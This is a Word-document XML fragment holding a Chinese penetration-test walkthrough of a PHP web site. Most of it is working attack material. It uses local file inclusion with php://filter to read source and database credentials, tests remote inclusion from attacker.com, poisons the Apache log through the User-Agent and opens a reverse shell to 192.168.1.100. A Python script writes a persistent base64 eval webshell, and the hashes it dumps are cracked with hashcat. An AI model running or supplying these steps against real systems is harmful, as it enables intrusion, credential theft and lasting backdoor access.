        <w:br/>
        <w:t>http://www.target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php</w:t>
        <w:br/>
        <w:t># 返回 Base64 编码的 index.php 源码</w:t>
        <w:br/>
        <w:t># PD9waHA...（解码后确实看到源码）</w:t>
        <w:br/>
        <w:br/>
        <w:t># 测试远程包含</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=http://attacker.com/shell.txt</w:t>
        <w:br/>
        <w:t># 返回空白或错误 -&gt; allow_url_include = Off</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>阶段二：确认利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 读取关键配置文件</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php</w:t>
        <w:br/>
        <w:t># Base64 解码后：</w:t>
        <w:br/>
        <w:t># &lt;?php</w:t>
        <w:br/>
        <w:t># $db_host = 'localhost';</w:t>
        <w:br/>
        <w:t># $db_user = 'root';</w:t>
        <w:br/>
        <w:t># $db_pass = 's3cr3tP@ss';</w:t>
        <w:br/>
        <w:t># $db_name = 'cms';</w:t>
        <w:br/>
        <w:t># ?&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取源码分析其他功能</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php</w:t>
        <w:br/>
        <w:t># 发现后台地址 /admin/login.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>阶段三：日志注入 GetShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>因为没有文件上传功能，选择日志注入方式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 1. 向 Apache 日志写入恶意代码</w:t>
        <w:br/>
        <w:t>curl -A "&lt;?php system($_GET['cmd']);?&gt;" http://www.target.com/index.php</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. 确认日志路径</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=../../../var/log/apache2/access.log</w:t>
        <w:br/>
        <w:t># 页面中可以看到日志内容（但格式混乱）</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. 在日志中查找 User-Agent 中的代码</w:t>
        <w:br/>
        <w:t># 通过查看日志内容确认 User-Agent 字段被记录</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4. 执行命令</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=../../../var/log/apache2/access.log&amp;cmd=id</w:t>
        <w:br/>
        <w:t># 返回：</w:t>
        <w:br/>
        <w:t># uid=33(www-data) gid=33(www-data) groups=33(www-data)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 5. 执行反弹 Shell</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=../../../var/log/apache2/access.log&amp;cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.100/6666 0&gt;&amp;1'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**日志注入自动化执行脚本**：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>target = "http://www.target.com/index.php"</w:t>
        <w:br/>
        <w:t>log_path = "../../../var/log/apache2/access.log"</w:t>
        <w:br/>
        <w:t>attacker_ip = "192.168.1.100"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 写入 Webshell 到日志</w:t>
        <w:br/>
        <w:t>print("[*] 写入恶意代码到日志...")</w:t>
        <w:br/>
        <w:t>requests.get(target, headers={"User-Agent": "&lt;?php system($_GET['c']);?&gt;"})</w:t>
        <w:br/>
        <w:br/>
        <w:t># 验证命令执行</w:t>
        <w:br/>
        <w:t>print("[*] 验证命令执行...")</w:t>
        <w:br/>
        <w:t>r = requests.get(f"{target}?page={log_path}&amp;c=whoami")</w:t>
        <w:br/>
        <w:t>print(f"User: {r.text}")</w:t>
        <w:br/>
        <w:br/>
        <w:t># 写一个持久化 Webshell 到 Web 目录（如果可写）</w:t>
        <w:br/>
        <w:t>print("[*] 尝试写入 Webshell...")</w:t>
        <w:br/>
        <w:t>r = requests.get(f"{target}?page={log_path}&amp;c=echo 'PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==' | base64 -d &gt; /var/www/html/shell.php")</w:t>
        <w:br/>
        <w:t>r = requests.get("http://www.target.com/shell.php")</w:t>
        <w:br/>
        <w:t>if r.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[+] Webshell 写入成功！http://www.target.com/shell.php")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[-] Webshell 写入失败，目录不可写")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>阶段四：深入利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 利用 Webshell 进一步操作</w:t>
        <w:br/>
        <w:t># 访问 http://www.target.com/shell.php</w:t>
        <w:br/>
        <w:t># 用蚁剑连接，密码 cmd</w:t>
        <w:br/>
        <w:br/>
        <w:t># 数据库操作</w:t>
        <w:br/>
        <w:t>mysql -u root -p's3cr3tP@ss' cms</w:t>
        <w:br/>
        <w:t>&gt; SELECT * FROM admin_users;</w:t>
        <w:br/>
        <w:t>+----+----------+----------------------------------+</w:t>
        <w:br/>
        <w:t>| id | username | password_hash                    |</w:t>
        <w:br/>
        <w:t>+----+----------+----------------------------------+</w:t>
        <w:br/>
        <w:t>|  1 | admin    | $2y$10$8KzQMGyg6hlyoVxVxjg...  |</w:t>
        <w:br/>
        <w:t>+----+----------+----------------------------------+</w:t>
        <w:br/>
        <w:br/>
        <w:t># 尝试破解哈希</w:t>
        <w:br/>
        <w:t>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</w:t>
        <w:br/>
        <w:t># admin:admin123</w:t>
        <w:br/>
        <w:br/>
        <w:t># 登录后台找到新的攻击面...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>阶段五：总结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阶段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用时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b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>关键操作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发现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2分钟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`../../../etc/passwd`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信息收集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10分钟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`php://filter` 读 config.php 和 admin.php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利用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15分钟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日志注入 User-Agent -&gt; LFI 包含执行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深入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20分钟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/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>数据库连接 -&gt; 后台登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>[!] **关键经验**：日志注入是"零文件"GetShell 的经典方式，注意日志内容会包含大量干扰信息，可用 `grep` 在日志中定位自己的注入点；读源码时优先读 config.php 和数据库配置相关文件；日志注入成功后尽快写入持久化 Webshell，因为日志文件会被轮转覆盖。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408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56B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70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